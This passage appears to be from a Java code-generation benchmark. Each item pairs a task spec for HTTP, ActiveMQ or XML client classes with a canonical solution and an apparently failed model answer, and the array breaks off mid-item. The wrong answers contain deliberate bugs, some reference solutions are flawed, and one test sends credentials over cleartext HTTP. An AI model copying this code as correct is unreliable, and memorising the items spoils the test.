[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message consumer capable of receiving messages from a specified queue, processing different message types (TextMessage and BytesMessage), and handling connection exceptions.\n\nClass Description: The ActiveMqConsumer class implements Runnable and ExceptionListener interfaces to asynchronously consume messages from an ActiveMQ broker while handling connection exceptions. It manages the JMS connection lifecycle and provides methods to start/stop the consumer.\n\nAttributes:\n- connection: Connection - JMS connection to the ActiveMQ broker\n- session: Session - JMS session for message processing\n- consumer: MessageConsumer - JMS message consumer for receiving messages\n- remoteUri: String - URI of the ActiveMQ broker\n- queueName: String - Name of the queue to consume messages from\n\nMethods:\n- ActiveMqConsumer(String remoteUri, String queueName) -> None - Constructor that initializes the broker URI and queue name\n- start() -> void - Creates connection factory, establishes connection, creates session and consumer\n- stop() -> void - Closes consumer, session and connection resources\n- run() -> void - Continuously receives and processes messages (TextMessage/BytesMessage)\n- onException(JMSException e) -> void - Exception handler that stops the consumer on connection errors\n- getConnection() -> Connection - Returns the JMS connection\n- getSession() -> Session - Returns the JMS session\n- getConsumer() -> MessageConsumer - Returns the message consumer",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Connection;\nimport javax.jms.Destination;\nimport javax.jms.ExceptionListener;\nimport javax.jms.JMSException;\nimport javax.jms.Message;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport com.sitewhere.spi.SiteWhereException;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() throws SiteWhereException {\n        try {\n            ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(remoteUri);\n            this.connection = connectionFactory.createConnection();\n            this.connection.setExceptionListener(this);\n            this.connection.start();\n            this.session = this.connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            Destination destination = this.session.createQueue(queueName);\n            this.consumer = this.session.createConsumer(destination);\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error starting ActiveMQ consumer.\", e);\n        }\n    }\n\n    public void stop() throws SiteWhereException {\n        try {\n            this.consumer.close();\n            this.session.close();\n            this.connection.close();\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error shutting down ActiveMQ consumer.\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = consumer.receive();\n                if (message == null) {\n                    break;\n                }\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    byte[] payload = textMessage.getText().getBytes();\n                    // Process payload here\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] buffer = new byte[(int) bytesMessage.getBodyLength()];\n                    // Process buffer here\n                }\n            } catch (Throwable e) {\n                return;\n            }\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        try {\n            stop();\n        } catch (SiteWhereException e1) {\n        }\n    }\n\n    protected Connection getConnection() {\n        return connection;\n    }\n\n    protected Session getSession() {\n        return session;\n    }\n\n    protected MessageConsumer getConsumer() {\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "wrong_result": "import javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport org.apache.activemq.command.ActiveMQQueue;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n    private volatile boolean running = true;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() {\n        try {\n            ConnectionFactory cf = new ActiveMQConnectionFactory(remoteUri);\n            connection = cf.createConnection();\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            Destination destination = new ActiveMQQueue(queueName);\n            consumer = session.createConsumer(destination);\n            connection.start();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (consumer != null) consumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (running) {\n            try {\n                Message message = consumer.receive();\n                if (message instanceof TextMessage) {\n                    TextMessage textMsg = (TextMessage) message;\n                    System.out.println(\"Received TextMessage: \" + textMsg.getText());\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMsg = (BytesMessage) message;\n                    byte[] buffer = new byte[(int) bytesMsg.getSize()];\n                    bytesMsg.readBytes(buffer);\n                    System.out.println(\"Received BytesMessage: \" + new String(buffer));\n                }\n            } catch (JMSException e) {\n                onException(e);\n                break;\n            }\n        }\n    }\n\n    public void onException(JMSException e) {\n        System.err.println(\"Exception occurred: \" + e.getMessage());\n        running = false;\n        stop();\n    }\n\n    public Connection getConnection() {\n        return connection;\n    }\n\n    public Session getSession() {\n        return session;\n    }\n\n    public MessageConsumer getConsumer() {\n        return consumer;\n    }\n}"
  },
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Java HTTP client class that handles various types of HTTP requests, including multipart form data uploads, with support for proxy configuration and connection retries.\n\nClass Description: The HttpClient class provides functionality to make HTTP requests with configurable methods, headers, and request bodies. It supports both simple requests and multipart form data uploads, handles connection retries through a retry handler, and allows proxy configuration.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart requests (default \"--\")\n- boundary: String - Unique boundary string for multipart requests\n- handler: HttpConnectionRetryHandler - Handler for connection retry logic\n- proxyHost: String - Proxy host address\n- proxyPort: String - Proxy port number\n- me: HttpClient - Singleton instance reference\n\nMethods:\n- getInstance() -> HttpClient - Returns the singleton instance of HttpClient\n- connect(String method, Properties props) -> void - Establishes HTTP connection with given method and properties (throws HttpClientException)\n- doConnection(String method, Properties props) -> void - Internal method to create and configure HTTP connection (throws IOException)\n- downloadImage(String imgName) -> byte[] - Downloads an image by name and returns as byte array\n- connectForMultipart() -> void - Prepares connection for multipart form data upload (throws Exception)\n- addFormPart(String paramName, String value) -> void - Adds a form part to multipart request (throws Exception)\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file part to multipart request (throws Exception)\n- finishMultipart() -> void - Finalizes multipart request (throws Exception)\n- getResponse() -> String - Reads and returns server response (throws Exception)\n- writeParamData(String paramName, String value) -> void - Internal method to write form parameter data (throws Exception)\n- setUrl(String url) -> void - Sets the target URL\n- setProxy(String host, String port) -> void - Configures proxy settings",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Enumeration;\nimport java.util.Properties;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n    \n    private HttpConnectionRetryHandler handler;\n    \n    private String proxyHost;\n    private String proxyPort;\n    \n    private static HttpClient me;\n    \n    public static HttpClient getInstance() {\n        if (me == null)\n            me = new HttpClient();\n        \n        return me;\n    }\n\n    private HttpClient() { }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        boolean status  = true;\n        int attemptNumber = 0;\n        while (status) {\n            try {\n                attemptNumber++;\n                doConnection(method, props);\n                status = false;\n            }\n            catch(Throwable t) {\n                if (handler != null) {\n                    status = handler.shouldRetry(t, attemptNumber);\n                    if (!status)\n                        throw new HttpClientException(t);\n                }\n                else {                    \n                    throw new HttpClientException(t);\n                }\n            }\n        }\n    }\n    \n    private void doConnection(String method, Properties props) throws IOException {\n        if (proxyPort != null && proxyHost != null) {\n            Proxy p = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, Integer.parseInt(proxyPort)));\n            con = (HttpURLConnection) ( new URL(url)).openConnection(p);\n        }\n        else\n            con = (HttpURLConnection) ( new URL(url)).openConnection();\n        \n        con.setRequestMethod(method);\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setConnectTimeout(5 * 1000);\n        \n        if (props != null) {\n            Enumeration keys = props.keys();\n            while (keys.hasMoreElements()) {\n                String key = (String) keys.nextElement();\n                String val = props.getProperty(key);\n                con.setRequestProperty(key, val);\n            }\n        }\n        \n        con.connect();\n    }\n\n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connect(\"Post\", null);\n            con.getOutputStream().write((\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while (is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        Properties props = new Properties();\n        props.setProperty(\"Connection\", \"Keep-Alive\");\n        props.setProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n\n        connect(\"POST\", props);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"Content-Type: application/octet-stream\\r\\n\").getBytes());\n        os.write((\"Content-Transfer-Encoding: binary\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        os.write((delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n\n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while (is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write(\"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n    \n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    private static final HttpClient me = new HttpClient();\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private String delimiter = \"--\";\n    private String boundary;\n    private HttpConnectionRetryHandler handler;\n    private String proxyHost;\n    private String proxyPort;\n\n    private HttpClient() {\n    }\n\n    public static HttpClient getInstance() {\n        return me;\n    }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        try {\n            doConnection(method, props);\n        } catch (IOException e) {\n            if (handler != null && handler.retry()) {\n                try {\n                    doConnection(method, props);\n                } catch (IOException ex) {\n                    throw new HttpClientException(\"Connection failed\", ex);\n                }\n            } else {\n                throw new HttpClientException(\"Connection failed\", e);\n            }\n        }\n    }\n\n    private void doConnection(String method, Properties props) throws IOException {\n        con = (HttpURLConnection) new URL(url).openConnection();\n        con.setRequestMethod(method);\n\n        if (proxyHost != null && proxyPort != null) {\n            int port = Integer.parseInt(proxyPort);\n            con.setProxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, port)));\n        }\n\n        if (props != null) {\n            for (String key : props.stringPropertyNames()) {\n                con.setRequestProperty(key, props.getProperty(key));\n            }\n        }\n    }\n\n    public byte[] downloadImage(String imgName) throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        while ((bytesRead = is.read(buffer)) != -1) {\n            baos.write(buffer, 0, bytesRead);\n        }\n        return baos.toByteArray();\n    }\n\n    private void connectForMultipart() throws Exception {\n        boundary = generateBoundary();\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        os = con.getOutputStream();\n    }\n\n    private String generateBoundary() {\n        return \"----\" + System.currentTimeMillis() + \"-\" + Math.random();\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write((delimiter + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write(value.getBytes());\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write((delimiter + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"Content-Type: application/octet-stream\\r\\n\\r\\n\".getBytes());\n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        os.write((delimiter + \"--\\r\\n\").getBytes());\n        os.flush();\n        os.close();\n    }\n\n    public String getResponse() throws Exception {\n        StringBuilder response = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        return response.toString();\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n\n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n\n    public static class HttpClientException extends Exception {\n        public HttpClientException(String message) {\n            super(message);\n        }\n\n        public HttpClientException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n\n    public interface HttpConnectionRetryHandler {\n        boolean retry();\n    }\n}"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a Java class that demonstrates how to make an HTTP request using HttpURLConnection, including setting connection timeouts and request headers, and handling the response.\n\nClass Description: The CleartextHttpCredentialsTest class is designed to test basic HTTP connectivity with a target URL. It demonstrates how to establish a connection, set timeouts, add request headers, and retrieve response information. The class focuses on proper resource cleanup after the connection is used.\n\nAttributes:\n- TARGET: [String] - A constant storing the URL to which the HTTP request will be made\n\nMethods:\n- runTest: [runTest]() -> [void] - Executes the HTTP request to the target URL. Sets connection timeouts, adds an Authorization header, retrieves the response code and message, and ensures proper connection cleanup. Throws Exception if any step fails.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CleartextHttpCredentialsTest {\n\n  private static final String TARGET = \"http://www.google.com\";\n\n  public void runTest() throws Exception {\n    HttpURLConnection connection = null;\n    try {\n      connection = (HttpURLConnection) new URL(TARGET).openConnection();\n      connection.setConnectTimeout(20000);\n      connection.setReadTimeout(20000);\n      connection.setRequestProperty(\"Authorization\", \"value\");\n      int responseCode = connection.getResponseCode();\n      String responseMessage = connection.getResponseMessage();\n    } finally {\n      if (connection != null) {\n        connection.disconnect();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.IOException;\n\npublic class CleartextHttpCredentialsTest {\n    private static final String TARGET = \"http://example.com\";\n\n    public void runTest() throws Exception {\n        try (HttpURLConnection connection = (HttpURLConnection) new URL(TARGET).openConnection()) {\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.setRequestProperty(\"Authorization\", \"Basic dXNlcm5hbWU6cGFzc3dvcmQ=\");\n            int responseCode = connection.getResponseCode();\n            String responseMessage = connection.getResponseMessage();\n            System.out.println(\"Response Code: \" + responseCode);\n            System.out.println(\"Response Message: \" + responseMessage);\n        } catch (IOException e) {\n            throw new Exception(\"Failed to connect: \" + e.getMessage(), e);\n        }\n    }\n}"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a Java class that asynchronously fetches weather data from a remote API using HTTP URL connection and processes the JSON response to extract sunrise and sunset times.\n\nClass Description: HttpWeatherClient is an Android utility class that performs asynchronous HTTP requests to fetch weather data and parse the JSON response. It uses AsyncTask to handle network operations off the main thread.\n\nAttributes: None (All variables are local to methods)\n\nMethods:\n1: WeatherAsyncTask(String... params) -> String - AsyncTask subclass that handles the background HTTP request. Takes URL string as input and returns null (results are processed via progress updates).\n2: onProgressUpdate(String... progress) -> void - Processes the JSON response to extract sunrise and sunset times from the astronomy data.\n3: convertStreamToString(InputStream inputStream) -> String - Helper method that converts an InputStream to a String for JSON parsing. Takes InputStream as input and returns the converted String.\n\nNote: All methods include basic exception handling with empty catch blocks as shown in the reference code. The class is designed for Android platform (uses android.os.AsyncTask).",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpWeatherClient {\n\n    public static class WeatherAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String weatherData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    weatherData = convertStreamToString(in);\n                    publishProgress(weatherData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                JSONObject query = json.getJSONObject(\"query\");\n                JSONObject results = query.getJSONObject(\"results\");\n                JSONObject channel = results.getJSONObject(\"channel\");\n                JSONObject astronomy = channel.getJSONObject(\"astronomy\");\n                String sunset = astronomy.getString(\"sunset\");\n                String sunrise = astronomy.getString(\"sunrise\");\n            } catch (Exception ex) {}\n        }\n    }\n\n    private static String convertStreamToString(InputStream inputStream) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String result = \"\";\n\n        try {\n            while ((line = reader.readLine()) != null) {\n                result += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpWeatherClient {\n    public static class WeatherAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.connect();\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    InputStream inputStream = connection.getInputStream();\n                    String json = HttpWeatherClient.convertStreamToString(inputStream);\n                    publishProgress(json);\n                }\n            } catch (Exception e) {\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject jsonObject = new JSONObject(progress[0]);\n                JSONObject astronomy = jsonObject.getJSONObject(\"astronomy\");\n                String sunrise = astronomy.getString(\"sunrise\");\n                String sunset = astronomy.getString(\"sunset\");\n            } catch (Exception e) {\n            }\n        }\n    }\n\n    private static String convertStreamToString(InputStream inputStream) {\n        StringBuilder stringBuilder = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                stringBuilder.append(line);\n            }\n        } catch (IOException e) {\n        }\n        return stringBuilder.toString();\n    }\n}"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs an HTTP/HTTPS request with XML data and parses the XML response into a key-value map.\n\nFunction Description: This function sends an HTTP/HTTPS request (GET/POST) to a specified URL with XML data as input, then parses the XML response into a Map<String, Object> where keys are XML element names and values are their text content. The function handles connection setup, request configuration, data transmission, response parsing, and resource cleanup.\n\nInput:\n- requestUrl: String - The target URL for the HTTP request\n- requestMethod: String - The HTTP method to use (e.g., \"GET\" or \"POST\")\n- xmlStr: String - The XML data to send with the request (can be null for GET requests)\n\nOutput:\n- Map<String, Object> - A map containing key-value pairs parsed from the XML response, where keys are XML element names and values are their text content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.HashMap;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic static Map<String, Object> httpXmlRequest(String requestUrl, String requestMethod, String xmlStr) {\n    Map<String, Object> map = new HashMap<String, Object>();\n    try {\n        HttpsURLConnection urlCon = (HttpsURLConnection) (new URL(requestUrl)).openConnection();\n        urlCon.setDoInput(true);\n        urlCon.setDoOutput(true);\n        urlCon.setRequestMethod(requestMethod);\n\n        if (\"GET\".equalsIgnoreCase(requestMethod)) {\n            urlCon.connect();\n        }\n\n        urlCon.setRequestProperty(\"Content-Length\", String.valueOf(xmlStr.getBytes().length));\n        urlCon.setUseCaches(false);\n        if (null != xmlStr) {\n            OutputStream outputStream = urlCon.getOutputStream();\n            outputStream.write(xmlStr.getBytes(\"UTF-8\"));\n            outputStream.flush();\n            outputStream.close();\n        }\n        InputStream inputStream = urlCon.getInputStream();\n        InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStreamReader);\n        Element root = document.getRootElement();\n        List<Element> elementList = root.elements();\n        for (Element e : elementList) {\n            map.put(e.getName(), e.getText());\n        }\n        inputStreamReader.close();\n        inputStream.close();\n        inputStream = null;\n        urlCon.disconnect();\n    } catch (MalformedURLException e) {\n        LOG.error(e.getMessage());\n    } catch (IOException e) {\n        LOG.error(e.getMessage());\n    } catch (Exception e) {\n        LOG.error(e.getMessage());\n    }\n    return map;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport javax.xml.parsers.*;\nimport org.w3c.dom.*;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\npublic class XmlRequestHandler {\n    public static Map<String, Object> sendXmlRequest(String requestUrl, String requestMethod, String xmlStr) throws Exception {\n        Map<String, Object> result = new HashMap<>();\n        URL url = new URL(requestUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n\n        if (\"POST\".equals(requestMethod)) {\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/xml\");\n            try (OutputStream os = conn.getOutputStream()) {\n                if (xmlStr != null) {\n                    os.write(xmlStr.getBytes(\"UTF-8\"));\n                }\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n\n        try (InputStream is = conn.getInputStream()) {\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            InputSource isrc = new InputSource(is);\n            Document doc = dBuilder.parse(isrc);\n            doc.getDocumentElement().normalize();\n\n            Queue<Node> queue = new LinkedList<>();\n            queue.add(doc.getDocumentElement());\n\n            while (!queue.isEmpty()) {\n                Node node = queue.poll();\n                if (node.getNodeType() == Node.ELEMENT_NODE) {\n                    Element element = (Element) node;\n                    String tagName = element.getTagName();\n                    String text = element.getTextContent();\n                    result.put(tagName, text);\n                }\n                for (int i = 0; i < node.getChildNodes().getLength(); i++) {\n                    Node child = node.getChildNodes().item(i);\n                    queue.add(child);\n                }\n            }\n        }\n        return result;\n    }\n}"
  },
  {
    "Task_id": 105,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection for making HTTP requests and handling responses.\n\nClass Description: The Http class provides a static method for sending HTTP requests to a specified URL with configurable request methods and payloads. It handles connection setup, request sending, response reading, and resource cleanup.\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String requestMethod, String outputStr) -> String - Sends an HTTP request to the specified URL using the given method and optional request body, then returns the response as a string.\n  - requestUrl: String - The target URL for the HTTP request\n  - requestMethod: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n  - outputStr: String - The request body to send (can be null for requests without body)\n  - Returns: String - The response body from the server, or null if an error occurs\n\nThe method handles:\n1. Creating and configuring HttpURLConnection\n2. Setting request headers (content-type: text/xml; charset=UTF-8)\n3. Sending request body if provided\n4. Reading and concatenating response\n5. Proper resource cleanup\n6. Error handling and logging",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport com.scudata.common.Logger;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {    \n        try {    \n            URL url = new URL(requestUrl);    \n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();    \n              \n            conn.setDoOutput(true);    \n            conn.setDoInput(true);    \n            conn.setUseCaches(false);    \n            conn.setRequestMethod(requestMethod);    \n            conn.setRequestProperty(\"content-type\", \"text/xml; charset=UTF-8\");\n            \n            if (null != outputStr) {    \n                OutputStream outputStream = conn.getOutputStream();    \n                outputStream.write(outputStr.getBytes(\"UTF-8\"));    \n                outputStream.close();    \n            }    \n            \n            InputStream inputStream = conn.getInputStream();    \n            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"utf-8\");    \n            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);    \n            String str = null;  \n            StringBuffer buffer = new StringBuffer();    \n            while ((str = bufferedReader.readLine()) != null) {    \n                buffer.append(str);    \n            }    \n            \n            bufferedReader.close();    \n            inputStreamReader.close();    \n            inputStream.close();    \n            inputStream = null;    \n            conn.disconnect();    \n            return buffer.toString();    \n        } catch (Exception e) {    \n            System.out.println(\"http exception{}\"+ e);\n            Logger.error(e.getMessage());\n        }    \n        return null;    \n    }    \n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.OutputStream;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\nimport java.io.IOException;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(requestMethod);\n            conn.setRequestProperty(\"Content-Type\", \"text/xml; charset=UTF-8\");\n            \n            if (\"POST\".equalsIgnoreCase(requestMethod) || \"PUT\".equalsIgnoreCase(requestMethod)) {\n                conn.setDoOutput(true);\n                try (OutputStream os = conn.getOutputStream()) {\n                    byte[] input = outputStr.getBytes(\"UTF-8\");\n                    os.write(input);\n                }\n            }\n            \n            StringBuilder response = new StringBuilder();\n            try (InputStream is = conn.getInputStream();\n                 BufferedReader br = new BufferedReader(new InputStreamReader(is))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.append(line);\n                }\n            } catch (IOException e) {\n                return null;\n            }\n            \n            return response.toString();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch and process JSON data from a given URL.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests and processing JSON responses. The main functionality is implemented through an AsyncTask subclass to avoid blocking the main thread during network operations.\n\nAttributes: \n(None - This is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, retrieves data, and processes the response.\n\nMethod2: onProgressUpdate(String... progress) -> void - A callback method that processes the received JSON data during the task's execution. It parses the JSON array and extracts individual JSON objects.\n\nMethod3: onPostExecute(String result2) -> void - A callback method that handles post-execution tasks after the background operation completes.\n\nMethod4: ConvertInputToStringNoChange(InputStream inputStream) -> String - A helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.",
